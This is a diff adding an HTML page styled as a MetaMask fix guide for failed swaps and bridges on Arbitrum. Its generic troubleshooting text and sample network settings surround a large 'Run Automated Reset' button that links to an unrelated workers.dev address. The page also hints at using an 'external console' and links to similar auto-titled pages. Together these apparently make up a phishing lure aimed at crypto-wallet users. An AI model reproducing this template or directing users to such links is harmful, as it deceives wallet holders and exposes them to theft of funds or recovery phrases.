@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network – Fix Guide</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #121214;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users experience failures when attempting to swap or bridge assets on the Arbitrum network using the Metamask extension, resulting in transaction errors and failed operations.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a compatibility issue between the Metamask extension and the Arbitrum network, specifically related to the handling of layer 2 transactions and the bridge protocol.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Update the Metamask extension to the latest version to ensure compatibility with the Arbitrum network.</li>
+<li>Configure the Arbitrum network settings manually in the Metamask extension to ensure correct RPC and bridge settings.</li>
+<li>Use the following JSON configuration to override the default bridge settings:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;rpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://arb1.arbitrum.io/rpc&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;bridge&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://bridge.arbitrum.io&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">42161</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider using an external console for advanced debugging and configuration.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured.</li>
+<li>Arbitrum network added to the Metamask extension.</li>
+<li>Latest version of the Metamask extension updated and installed.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
